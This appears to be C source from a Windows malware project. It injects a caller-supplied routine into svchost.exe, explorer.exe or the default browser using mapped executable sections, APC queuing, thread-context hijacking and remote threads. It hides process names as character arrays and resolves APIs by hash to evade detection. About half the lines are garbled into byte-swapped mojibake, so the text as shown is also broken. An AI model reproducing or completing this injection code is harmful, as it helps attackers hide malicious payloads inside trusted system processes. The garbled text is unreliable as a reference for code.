਀ऀ洀开洀攀洀挀瀀礀⠀ 氀瀀嘀椀攀眀Ⰰ ⠀䰀倀嘀伀䤀䐀⤀搀眀䈀愀猀攀Ⰰ 搀眀匀椀稀攀 ⤀㬀 
਀ऀ䐀圀伀刀䐀 搀眀嘀椀攀眀匀椀稀攀    㴀 　㬀 
	DWORD dwNewBaseAddr = 0;਀ 
	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, &dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, 1, 0, PAGE_EXECUTE_READWRITE );਀ 
	if ( Status == STATUS_SUCCESS )਀ऀ笀 
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;਀ऀऀ倀䤀䴀䄀䜀䔀开一吀开䠀䔀䄀䐀䔀刀匀 渀琀䠀攀愀搀攀爀猀 㴀 ⠀倀䤀䴀䄀䜀䔀开一吀开䠀䔀䄀䐀䔀刀匀⤀刀嘀䄀吀伀嘀䄀⠀搀眀䈀愀猀攀Ⰰ 搀䠀攀愀搀攀爀ⴀ㸀攀开氀昀愀渀攀眀⤀㬀 
਀ऀऀ唀䰀伀一䜀 刀攀氀刀嘀䄀   㴀 渀琀䠀攀愀搀攀爀猀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀㬀 
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;਀ 
		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );		਀ 
		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;਀ 
	਀ऀऀ椀昀 ⠀ ⠀一吀匀吀䄀吀唀匀⤀瀀娀眀儀甀攀甀攀䄀瀀挀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ ⠀䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀⤀搀眀䄀搀搀爀Ⰰ 一唀䰀䰀Ⰰ 一唀䰀䰀Ⰰ 一唀䰀䰀 ⤀ 㴀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀 ⤀ 
		{਀ऀऀऀ瀀娀眀刀攀猀甀洀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 一唀䰀䰀 ⤀㬀 
		}਀ऀऀ攀氀猀攀 
		{਀ऀऀऀ瀀吀攀爀洀椀渀愀琀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 　 ⤀㬀 
		}਀ऀ紀 
਀ऀ瀀唀渀洀愀瀀嘀椀攀眀伀昀䘀椀氀攀⠀ 氀瀀嘀椀攀眀 ⤀㬀 
    pCloseHandle( hMap );਀ 
	return true;਀紀 
਀戀漀漀氀 䤀渀樀攀挀琀䌀漀搀攀㌀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀Ⰰ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 䤀渀樀攀挀琀䌀漀搀攀⠀ 栀倀爀漀挀攀猀猀Ⰰ 昀开䴀愀椀渀 ⤀㬀 
਀ऀ椀昀 ⠀ 搀眀䄀搀搀爀 ℀㴀 ⴀ㄀ ⤀ 
	{਀ऀऀ䌀伀一吀䔀堀吀 䌀漀渀琀攀砀琀㬀 
਀ऀऀ洀开洀攀洀猀攀琀⠀ ☀䌀漀渀琀攀砀琀Ⰰ 　Ⰰ 猀椀稀攀漀昀⠀ 䌀伀一吀䔀堀吀 ⤀ ⤀㬀 
਀ऀऀ䌀漀渀琀攀砀琀⸀䌀漀渀琀攀砀琀䘀氀愀最猀 㴀 䌀伀一吀䔀堀吀开䤀一吀䔀䜀䔀刀㬀 
		Context.Eax			 = dwAddr;਀ 
		DWORD dwBytes = 0;਀ 
        pWriteProcessMemory( hProcess,(LPVOID)( Context.Ebx + 8 ), &dwNewBase, 4, &dwBytes );਀        瀀娀眀匀攀琀䌀漀渀琀攀砀琀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ ☀䌀漀渀琀攀砀琀 ⤀㬀 
        pZwResumeThread( hThread, NULL );਀ऀ紀 
਀ऀ爀攀琀甀爀渀 琀爀甀攀㬀 
}਀ 
bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread )਀笀 
	WCHAR Svchost[] = {'s','v','c','h','o','s','t','.','e','x','e',0};਀ऀ圀䌀䠀䄀刀 䄀爀最猀嬀崀ऀ㴀 笀✀ⴀ✀Ⰰ✀欀✀Ⰰ✀ ✀Ⰰ✀渀✀Ⰰ✀攀✀Ⰰ✀琀✀Ⰰ✀猀✀Ⰰ✀瘀✀Ⰰ✀挀✀Ⰰ✀猀✀Ⰰ　紀㬀 
਀ऀ圀䌀䠀䄀刀 ⨀匀礀猀倀愀琀栀 㴀 ⠀圀䌀䠀䄀刀⨀⤀䴀攀洀䄀氀氀漀挀⠀ 㔀㄀㈀ ⤀㬀 
਀ऀ椀昀 ⠀ ℀匀礀猀倀愀琀栀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	pGetSystemDirectoryW( SysPath, 512 );਀ 
	plstrcatW( SysPath, L"\\" );਀ऀ瀀氀猀琀爀挀愀琀圀⠀ 匀礀猀倀愀琀栀Ⰰ 匀瘀挀栀漀猀琀 ⤀㬀 
਀ऀ倀刀伀䌀䔀匀匀开䤀一䘀伀刀䴀䄀吀䤀伀一 瀀椀㬀 
	STARTUPINFOW si;਀ 
	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		਀ऀ猀椀⸀挀戀ऀ㴀 猀椀稀攀漀昀⠀ 匀吀䄀刀吀唀倀䤀一䘀伀圀 ⤀㬀 
਀ऀ戀漀漀氀 爀攀琀 㴀 昀愀氀猀攀㬀 
	਀ऀ椀昀⠀ ⠀䈀伀伀䰀⤀瀀䌀爀攀愀琀攀倀爀漀挀攀猀猀圀⠀ 匀礀猀倀愀琀栀Ⰰ 䄀爀最猀Ⰰ 　Ⰰ 　Ⰰ 吀刀唀䔀Ⰰ 䌀刀䔀䄀吀䔀开匀唀匀倀䔀一䐀䔀䐀Ⰰ 　Ⰰ 　Ⰰ ☀猀椀Ⰰ ☀瀀椀 ⤀ ⤀ 
	{਀ऀऀ⨀栀倀爀漀挀攀猀猀 㴀 瀀椀⸀栀倀爀漀挀攀猀猀㬀 
		*hThread  = pi.hThread;਀ 
		ret = true;਀ऀ紀 
਀ऀ䴀攀洀䘀爀攀攀⠀ 匀礀猀倀愀琀栀 ⤀㬀 
	return ret;਀紀 
਀戀漀漀氀 䌀爀攀愀琀攀䔀砀瀀氀漀爀攀爀⠀ 倀䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 倀䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀 ⤀ 
{਀ऀ圀䌀䠀䄀刀 䔀砀瀀氀漀爀攀爀嬀崀 㴀 笀✀攀✀Ⰰ✀砀✀Ⰰ✀瀀✀Ⰰ✀氀✀Ⰰ✀漀✀Ⰰ✀爀✀Ⰰ✀攀✀Ⰰ✀爀✀Ⰰ✀⸀✀Ⰰ✀攀✀Ⰰ✀砀✀Ⰰ✀攀✀Ⰰ　紀㬀 
਀ऀ圀䌀䠀䄀刀 ⨀匀礀猀倀愀琀栀 㴀 ⠀圀䌀䠀䄀刀⨀⤀䴀攀洀䄀氀氀漀挀⠀ 㔀㄀㈀ ⤀㬀 
਀ऀ椀昀 ⠀ 匀礀猀倀愀琀栀 㴀㴀 一唀䰀䰀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	pGetWindowsDirectoryW( SysPath, 512 );਀ 
	plstrcatW( SysPath, L"\\" );਀ऀ瀀氀猀琀爀挀愀琀圀⠀ 匀礀猀倀愀琀栀Ⰰ 䔀砀瀀氀漀爀攀爀 ⤀㬀 
਀ 
	HANDLE hTmpProcess = NULL;਀ऀ䠀䄀一䐀䰀䔀 栀吀洀瀀吀栀爀攀愀搀  㴀 一唀䰀䰀㬀 
਀ऀ戀漀漀氀 爀攀琀 㴀 刀甀渀䘀椀氀攀䔀砀⠀ 匀礀猀倀愀琀栀Ⰰ 䌀刀䔀䄀吀䔀开匀唀匀倀䔀一䐀䔀䐀Ⰰ ☀栀吀洀瀀倀爀漀挀攀猀猀Ⰰ ☀栀吀洀瀀吀栀爀攀愀搀 ⤀㬀 
਀ऀ椀昀 ⠀ 爀攀琀 ⤀ 
	{਀ऀऀ⨀栀倀爀漀挀攀猀猀 㴀 栀吀洀瀀倀爀漀挀攀猀猀㬀 
		*hThread  = hTmpThread;਀ऀ紀 
਀ऀ爀攀琀甀爀渀 爀攀琀㬀 
}਀ 
਀圀䌀䠀䄀刀 ⨀䜀攀琀䐀攀昀愀甀氀琀䈀爀漀眀猀攀爀倀愀琀栀⠀⤀ 
{਀ऀ圀䌀䠀䄀刀 䠀琀洀氀嬀崀 㴀 笀✀尀尀✀Ⰰ✀椀✀Ⰰ✀渀✀Ⰰ✀搀✀Ⰰ✀攀✀Ⰰ✀砀✀Ⰰ✀⸀✀Ⰰ✀栀✀Ⰰ✀琀✀Ⰰ✀洀✀Ⰰ✀氀✀Ⰰ　紀㬀 
਀ऀ圀䌀䠀䄀刀 ⨀倀愀琀栀 㴀 䜀攀琀匀栀攀氀氀䘀漀氀搀攀爀猀䬀攀礀⠀ ㈀ ⤀㬀 
਀ऀ瀀氀猀琀爀挀愀琀圀⠀ 倀愀琀栀Ⰰ 䠀琀洀氀 ⤀㬀 
਀ऀ䠀䄀一䐀䰀䔀 栀䘀椀氀攀 㴀 瀀䌀爀攀愀琀攀䘀椀氀攀圀⠀ 倀愀琀栀Ⰰ 　Ⰰ 　Ⰰ 　Ⰰ 䌀刀䔀䄀吀䔀开䄀䰀圀䄀夀匀Ⰰ 　Ⰰ 　⤀㬀 
਀ऀ椀昀 ⠀ 栀䘀椀氀攀 㴀㴀 䤀一嘀䄀䰀䤀䐀开䠀䄀一䐀䰀䔀开嘀䄀䰀唀䔀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	pCloseHandle( hFile );਀ 
	WCHAR *BrowserPath = (WCHAR*)MemAlloc( MAX_PATH );਀ 
	if ( BrowserPath == NULL )਀ऀ笀 
		return false;਀ऀ紀 
਀ऀ瀀䘀椀渀搀䔀砀攀挀甀琀愀戀氀攀圀⠀ 倀愀琀栀Ⰰ 䰀∀∀Ⰰ 䈀爀漀眀猀攀爀倀愀琀栀 ⤀㬀 
਀ऀ瀀䐀攀氀攀琀攀䘀椀氀攀圀⠀ 倀愀琀栀 ⤀㬀 
਀ऀ䴀攀洀䘀爀攀攀⠀ 倀愀琀栀 ⤀㬀 
਀ऀ爀攀琀甀爀渀 䈀爀漀眀猀攀爀倀愀琀栀㬀 
}਀ 
bool CreateDefaultBrowser( PHANDLE hProcess, PHANDLE hThread )਀笀 
	PROCESS_INFORMATION pi;਀ऀ匀吀䄀刀吀唀倀䤀一䘀伀圀 猀椀㬀 
਀ऀ洀开洀攀洀猀攀琀⠀ ☀猀椀Ⰰ 　Ⰰ 猀椀稀攀漀昀⠀ 匀吀䄀刀吀唀倀䤀一䘀伀圀 ⤀ ⤀㬀ऀऀ 
	si.cb	= sizeof( STARTUPINFOW );਀ 
	WCHAR *BrowserPath = GetDefaultBrowserPath();਀ 
	if ( BrowserPath == NULL )਀ऀ笀 
		return false;਀ऀ紀 
	਀ऀ椀昀⠀ 瀀䌀爀攀愀琀攀倀爀漀挀攀猀猀圀⠀ 䈀爀漀眀猀攀爀倀愀琀栀Ⰰ 一唀䰀䰀Ⰰ 　Ⰰ 　Ⰰ 吀刀唀䔀Ⰰ 䌀刀䔀䄀吀䔀开匀唀匀倀䔀一䐀䔀䐀Ⰰ 　Ⰰ 　Ⰰ ☀猀椀Ⰰ ☀瀀椀 ⤀ ⤀ 
	{਀ऀऀ⨀栀倀爀漀挀攀猀猀 㴀 瀀椀⸀栀倀爀漀挀攀猀猀㬀 
		*hThread  = pi.hThread;਀ 
		return true;਀ऀ紀 
਀ऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
}਀ 
bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	HANDLE hProcess = NULL;਀ऀ䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀ऀ㴀 一唀䰀䰀㬀 
਀ऀ椀昀 ⠀ 䌀爀攀愀琀攀䐀攀昀愀甀氀琀䈀爀漀眀猀攀爀⠀ ☀栀倀爀漀挀攀猀猀Ⰰ ☀栀吀栀爀攀愀搀 ⤀ ⤀ 
	{਀ऀऀ椀昀 ⠀ 䤀渀樀攀挀琀䌀漀搀攀㈀⠀ 栀倀爀漀挀攀猀猀Ⰰ 栀吀栀爀攀愀搀Ⰰ 昀开䴀愀椀渀 ⤀ ⤀ 
		{਀ऀऀऀ爀攀琀甀爀渀 琀爀甀攀㬀 
		}਀ऀऀ攀氀猀攀 
		{਀ऀऀऀ瀀吀攀爀洀椀渀愀琀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 　 ⤀㬀 
		}਀ऀ紀 
਀ऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
}਀ 
਀戀漀漀氀 䨀洀瀀吀漀匀瘀挀栀漀猀琀匀攀氀昀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀 㴀 一唀䰀䰀㬀 
	HANDLE hThread	= NULL;਀ 
	if ( CreateSvchost( &hProcess, &hThread ) )਀ऀ笀 
		if ( InjectCode2( hProcess, hThread, f_Main ) )਀ऀऀ笀 
			return true;਀ऀऀ紀 
		else਀ऀऀ笀 
			pTerminateThread( hThread, 0 );਀ऀऀ紀 
	}਀ 
	return false;਀紀 
਀ 
bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	if ( !JmpToSvchostSelf( f_Main ) )਀ऀ笀 
		if ( !JmpToBrowserSelf( f_Main ) )਀ऀऀ笀 
			return false;਀ऀऀ紀 
	}਀ 
	return true;਀紀 
਀戀漀漀氀 䨀洀瀀吀漀䈀爀漀眀猀攀爀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀 㴀 一唀䰀䰀㬀 
	HANDLE hThread	= NULL;਀ 
	if ( CreateDefaultBrowser( &hProcess, &hThread ) )਀ऀ笀 
		if ( InjectCode3( hProcess, hThread, f_Main ) )਀ऀऀ笀 
			return true;਀ऀऀ紀 
		else਀ऀऀ笀 
			pTerminateThread( hThread, 0 );਀ऀऀ紀 
	}਀ 
	return false;਀紀 
਀戀漀漀氀 䨀洀瀀吀漀匀瘀挀栀漀猀琀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀 㴀 一唀䰀䰀㬀 
	HANDLE hThread	= NULL;਀ 
	bool bRet = false;਀ 
	if ( CreateSvchost( &hProcess, &hThread ) )਀ऀ笀 
		if ( InjectCode3( hProcess, hThread, f_Main ) )਀ऀऀ笀 
			return true;਀ऀऀ紀 
		else਀ऀऀ笀 
			pTerminateThread( hThread, 0 );਀ऀऀ紀 
	}਀ 
	return false;਀紀 
਀ 
bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	if ( !JmpToSvchost( f_Main ) )਀ऀ笀 
		if ( !JmpToBrowser( f_Main ) )਀ऀऀ笀 
			return false;਀ऀऀ紀 
	}਀ 
	return true;਀紀 
਀戀漀漀氀 䴀攀最愀䨀甀洀瀀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ椀昀 ⠀ ℀吀眀椀挀攀䨀甀洀瀀匀攀氀昀⠀ 昀开䴀愀椀渀 ⤀ ⤀ 
	{਀ऀऀ椀昀 ⠀ ℀吀眀椀挀攀䨀甀洀瀀⠀ 昀开䴀愀椀渀 ⤀ ⤀ 
		{਀ऀऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
		}਀ऀ紀 
਀ऀ爀攀琀甀爀渀 琀爀甀攀㬀 
}਀ 
bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	HANDLE hProcess = NULL;਀ऀ䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀ऀ㴀 一唀䰀䰀㬀 
਀ऀ戀漀漀氀 戀刀攀琀 㴀 昀愀氀猀攀㬀 
਀ऀ椀昀 ⠀ 䌀爀攀愀琀攀䔀砀瀀氀漀爀攀爀⠀ ☀栀倀爀漀挀攀猀猀Ⰰ ☀栀吀栀爀攀愀搀 ⤀ ⤀ 
	{਀ऀऀ椀昀 ⠀ 䤀渀樀攀挀琀䌀漀搀攀㈀⠀ 栀倀爀漀挀攀猀猀Ⰰ 栀吀栀爀攀愀搀Ⰰ 昀开䴀愀椀渀 ⤀ ⤀ 
		{਀ऀऀऀ爀攀琀甀爀渀 琀爀甀攀㬀 
		}਀ऀऀ攀氀猀攀 
		{਀ऀऀऀ瀀吀攀爀洀椀渀愀琀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 　 ⤀㬀 
		}਀ऀ紀 
਀ऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
}਀ 
਀戀漀漀氀 䤀渀樀攀挀琀䤀渀琀漀䔀砀瀀氀漀爀攀爀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀倀椀搀 㴀 䜀攀琀䔀砀瀀氀漀爀攀爀倀椀搀⠀⤀㬀 
਀ऀ椀昀 ⠀ 搀眀倀椀搀 㴀㴀 　 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;਀ऀ䌀䰀䤀䔀一吀开䤀䐀 䌀氀椀攀渀琀䤀䐀㬀 
਀ऀ䌀氀椀攀渀琀䤀䐀⸀唀渀椀焀甀攀倀爀漀挀攀猀猀 㴀 ⠀䠀䄀一䐀䰀䔀⤀搀眀倀椀搀㬀 
	ClientID.UniqueThread  = 0;਀ 
	HANDLE hProcess;਀ऀऀ 
	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )਀ऀ笀 
		return false;਀ऀ紀 
਀ऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 䤀渀樀攀挀琀䌀漀搀攀⠀ 栀倀爀漀挀攀猀猀Ⰰ 昀开䴀愀椀渀 ⤀㬀 
਀ऀ戀漀漀氀 爀攀琀 㴀 昀愀氀猀攀㬀 
਀ऀ椀昀 ⠀ 搀眀䄀搀搀爀 ℀㴀 ⴀ㄀ ⤀ 
	{਀ऀऀ椀昀 ⠀ 瀀䌀爀攀愀琀攀刀攀洀漀琀攀吀栀爀攀愀搀⠀ 栀倀爀漀挀攀猀猀Ⰰ 　Ⰰ 　Ⰰ ⠀䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀⤀搀眀䄀搀搀爀Ⰰ 一唀䰀䰀Ⰰ 　Ⰰ 　 ⤀ ℀㴀 一唀䰀䰀 ⤀ 
		{਀ऀऀऀ爀攀琀 㴀 琀爀甀攀㬀 
		}਀ऀ紀 
਀ऀ瀀娀眀䌀氀漀猀攀⠀ 栀倀爀漀挀攀猀猀 ⤀㬀 
	਀ऀ爀攀琀甀爀渀 爀攀琀㬀 
}਀ 
਀戀漀漀氀 䤀渀樀攀挀琀䐀氀氀⠀ 圀䌀䠀䄀刀 ⨀䐀氀氀倀愀琀栀 ⤀ 
{਀ऀ椀昀 ⠀ 瀀䜀攀琀䘀椀氀攀䄀琀琀爀椀戀甀琀攀猀圀⠀ 䐀氀氀倀愀琀栀 ⤀ ⤀ 
	{਀ऀऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀㬀 
		HANDLE hThread;਀ 
		if ( !CreateSvchost( &hProcess, &hThread ) )਀ऀऀ笀 
			if ( !CreateDefaultBrowser( &hProcess, &hThread ) )਀ऀऀऀ笀 
				return false;਀ऀऀऀ紀 
		}਀ऀऀ 
		DWORD dwWritten;਀ 
		LPVOID lpStringLoc = pVirtualAllocEx( hProcess, 0, m_wcslen( DllPath ) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );਀ऀऀ 
		if ( !(BOOL)pWriteProcessMemory( hProcess, lpStringLoc, DllPath, m_wcslen( DllPath ) + 1, &dwWritten ) )਀ऀऀ笀 
			return false;਀ऀऀ紀 
਀ऀऀ瀀䌀爀攀愀琀攀刀攀洀漀琀攀吀栀爀攀愀搀⠀ 栀倀爀漀挀攀猀猀Ⰰ 　Ⰰ 　Ⰰ ⠀䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀⤀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀䔀砀⠀ 一唀䰀䰀Ⰰ ㄀Ⰰ 　砀䌀㠀䄀䌀㠀　㌀　 ⤀Ⰰ 氀瀀匀琀爀椀渀最䰀漀挀Ⰰ 　Ⰰ 　 ⤀㬀 
	}਀ऀऀ 
	਀ऀ爀攀琀甀爀渀 琀爀甀攀㬀 
}਀ 
਀ 
਀ 
਀ 
਀�